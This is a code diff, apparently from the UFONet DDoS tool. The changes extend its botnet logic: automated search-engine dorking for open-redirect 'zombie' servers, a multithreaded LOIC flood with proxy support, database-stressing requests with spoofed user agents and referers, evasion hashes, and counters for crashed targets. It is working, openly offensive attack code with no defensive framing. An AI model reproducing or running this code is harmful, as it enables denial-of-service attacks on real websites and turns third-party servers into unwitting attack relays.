                 sep = str(dork)
             url_link = url_link.rsplit(sep, 1)[0] + sep
             if 'href="' in url_link:
@@ -1393,13 +1562,14 @@ class UFONet(object):
         if len(zombies) == 0: # print dorking results
             print "[Info] - Not any possible victim(s) found for this query!"
             if not options.dorks:
-                if not self.options.forceyes:
-                    return #sys.exit(2)
+                if not options.autosearch:
+                    if not self.options.forceyes:
+                        return #sys.exit(2)
         print '\n' + '='*22
         print('+Possible Zombies: ' + str(len(zombies)))
         self.total_possible_zombies = self.total_possible_zombies + len(zombies)
         print '='*22 + '\n'
-        if options.dorks:
+        if options.dorks or options.autosearch:
             print '-'*44 + '\n'
         return zombies
 
@@ -1413,7 +1583,8 @@ class UFONet(object):
             print("[Info] It seems that you are not using TOR to recieve data. Good!\n")
         else:
             print("[Error] You are using TOR as public IP... It's not possible to NAT!\n")
-            sys.exit(2) # exit
+            self.nat_error_flag = "ON"
+            return #sys.exit(2)
         try:
             data = str(urlopen('http://checkip.dyndns.com/').read()) # check for public ip
             self.pub_ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
@@ -1423,7 +1594,8 @@ class UFONet(object):
                 self.pub_ip = re.compile(r'">(\d+\.\d+\.\d+\.\d+)</span>').search(data).group(1)
             except:
                 print("[Error] Something wrong checking your public IP using an external service. Try it again!\n")
-                sys.exit(2) # exit
+                self.nat_error_flag = "ON"
+                return #sys.exit(2)
         print " + Public: " + self.pub_ip + "\n"
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(('8.8.8.8', 0))  # connecting to a UDP address doesn't send packets (black magic)
@@ -1506,8 +1678,11 @@ class UFONet(object):
                     else:
                         print "\n[Info] #UFONet TANGO DOWN!!! -> " +target + "\n"
                         self.update_targets_crashed() # update targets crashed stats
-                        if not self.options.web:
-                            sys.exit(2) # exit
+                        self.update_mothership_stats() # update mothership completed attack stats
+                        if self.options.web:
+                            return 
+                        else:
+                            sys.exit(2) # Debug traceback (without crash) for celebrate it! ;-)
                 except Exception:
                     print "[Error] Something wrong with your connection!"
                     if self.options.verbose:
@@ -1516,8 +1691,11 @@ class UFONet(object):
             else:
                 print "[Info] #UFONet TANGO DOWN!!! -> " +target + "\n"
                 self.update_targets_crashed() # update targets crashed stats
-                if not self.options.web:
-                    sys.exit(2) # exit
+                self.update_mothership_stats() # update mothership completed attack stats
+                if self.options.web:
+                    return 
+                else:
+                    sys.exit(2) # Debug traceback (without crash) for celebrate it! ;-)
 
     def send_aliens(self, target):
         # extract external web abuse services urls (POST) and perform requests against target
@@ -1714,23 +1892,6 @@ class UFONet(object):
                     print '\n[Error] - Cannot found:', 'zombies.txt', "\n"
                     return #sys.exit(2)
 
-    def update_rpcs(self, rpcs_ready):
-        # update rpcs on file
-        options = self.options
-        if options.testrpc:
-            f = open(self.rpcs_file, "w") # re-write list
-            for rpc in rpcs_ready: # add only rpc verified zombies
-                f.write(rpc + os.linesep)
-            f.close()
-        if options.download: # append only new rpcs to list
-            f = open(self.rpcs_file)
-            rpcs_on_file = f.read().splitlines()
-            with open(self.rpcs_file, "a") as rpc_list:
-                for rpc in rpcs_ready:
-                    if rpc not in rpcs_on_file: # parse possible repetitions
-                        rpc_list.write(rpc + os.linesep)
-            f.close()
-
     def update_zombies(self, zombies_ready):
         # update zombies on file
         options = self.options
@@ -1747,13 +1908,17 @@ class UFONet(object):
                 f.write(zombie + os.linesep)
             f.close()
 
-        if options.search or options.dorks or options.download: # append only new zombies to list (dorking supported)
+        if options.search or options.dorks or options.autosearch or options.download: # append only new zombies to list (dorking supported)
             f = open(self.zombies_file)
             zombies_on_file = f.read().splitlines()
             with open(self.zombies_file, "a") as zombie_list: 
                 for zombie in zombies_ready:
                     if zombie not in zombies_on_file: # parse possible repetitions
                         zombie_list.write(zombie + os.linesep)
+                        if options.download:
+                            self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
+                        else:
+                            self.scanned_zombies = self.scanned_zombies + 1 # update scanner stats only with new zombies (dorking)
             f.close()
 
     def update_aliens(self, aliens_ready):
@@ -1766,6 +1931,7 @@ class UFONet(object):
                 for alien in aliens_ready:
                     if alien not in aliens_on_file: # parse possible repetitions
                         alien_list.write(alien + os.linesep)
+                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
             f.close()
 
     def update_droids(self, droids_ready):
@@ -1778,6 +1944,7 @@ class UFONet(object):
                 for droid in droids_ready:
                     if droid not in droids_on_file: # parse possible repetitions
                         droid_list.write(droid + os.linesep)
+                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
             f.close()
 
     def update_ucavs(self, ucavs_ready):
@@ -1790,6 +1957,25 @@ class UFONet(object):
                 for ucav in ucavs_ready:
                     if ucav not in ucavs_on_file: # parse possible repetitions
                         ucav_list.write(ucav + os.linesep)
+                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
+            f.close()
+
+    def update_rpcs(self, rpcs_ready):
+        # update rpcs on file
+        options = self.options
+        if options.testrpc:
+            f = open(self.rpcs_file, "w") # re-write list
+            for rpc in rpcs_ready: # add only rpc verified zombies
+                f.write(rpc + os.linesep)
+            f.close()
+        if options.download: # append only new rpcs to list
+            f = open(self.rpcs_file)
+            rpcs_on_file = f.read().splitlines()
+            with open(self.rpcs_file, "a") as rpc_list:
+                for rpc in rpcs_ready:
+                    if rpc not in rpcs_on_file: # parse possible repetitions
+                        rpc_list.write(rpc + os.linesep)
+                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
             f.close()
 
     def search_rpc(self, rpc_host):
@@ -2017,9 +2203,10 @@ class UFONet(object):
                 self.update_zombies(zombies_ready)
                 if not self.options.upload:
                     print "\n[Info] - Botnet updated! ;-)\n"
+                    self.update_scanner_stats(self.scanned_zombies) # update json file with scanner stats (found via dorking)
 
     def attacking(self, zombies):
-        # Perform a DDoS Web attack against a target, using Open Redirect vectors on third party machines (aka 'zombies')
+        # Perform a DDoS Web attack against a target, using Open Redirect vectors (and other Web Abuse services) as 'zombies'
         target = self.options.target
         if target.startswith("https://"):
             target = target.replace("https://", "http://") # change target to 'http' (to evade a possible invalid SSL certificate)
@@ -2029,10 +2216,10 @@ class UFONet(object):
             # send Open Redirect injection (multiple zombies > one target url)
             reply = self.injection(target, zombies)
         else:
-            print "\n[Error] - Target url not valid!\n"
+            print "\n[Error] - Target url not valid! -> It should starts with 'http(s)://'\n"
 
     def stressing(self, target, zombie):
-        # Perform a DDoS Web attack against a target, requesting records on target's db
+        # Perform a DDoS Web attack against a target, requesting records on target's database
         db_input = self.options.dbstress
         def random_key(length):
             key = ''
@@ -2047,9 +2234,9 @@ class UFONet(object):
             length = 1 # search for one different (alphanumeric) character each time will produces more positive results on db
         key = str(random_key(length))
         if self.db_flash > 9:
-            print "[Info] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)"
+            print "\n[Info] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)"
         else:
-            print "[Info] Trying database request to: " + db_input + " | Query used: " + key
+            print "\n[Info] Trying database request to: " + db_input + " | Query used: " + key
         self.user_agent = random.choice(self.agents).strip() # suffle user-agent
         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         if not target.endswith('/'): # add "/" to end of target
@@ -2206,6 +2393,19 @@ class UFONet(object):
                 num_round = 1
                 num_hits = 0
                 num_zombie = 1
+                # start multi-threading DoS Web LOIC (Low Orbit Ion Cannon) with proxy support, if required
+                if self.options.loic:
+                    try:
+                        self.options.loic = int(self.options.loic)
+                    except:
+                        self.options.loic = 100 # default LOIC requests
+                    if self.options.loic < 1:
+                        self.options.loic = 100 # default LOIC requests
+                    self.instance = LOIC() # instance main class for LOIC operations
+                    t = threading.Thread(target=self.instance.attacking, args=(target, self.options.loic, self.options.proxy)) # attack with LOIC
+                    t.daemon = True
+                    t.start()
+                    self.update_loic_stats() # add new LOIC attack to mothership
                 # start to attack the target with each zombie
                 zombies = self.extract_zombies() # extract zombies from file
                 total_zombie = len(zombies)
@@ -2230,6 +2430,7 @@ class UFONet(object):
                         if not self.options.attackme:
                             print "[Info] Attacking from: " + name_zombie
                         else: # on attackme target url is dynamic -> http://public_ip:port/hash|zombie
+                            self.mothership_hash = random.getrandbits(128) # generating random evasion hash  
                             target = "http://" + str(self.pub_ip) + ":" + self.port + "/"+ str(self.mothership_hash) + "|" + zombie
                             self.options.target = target
                             print "Attacking: " + str(self.pub_ip) + ":" + self.port + " -> [LAN]" + self.local_ip + ":" + self.port
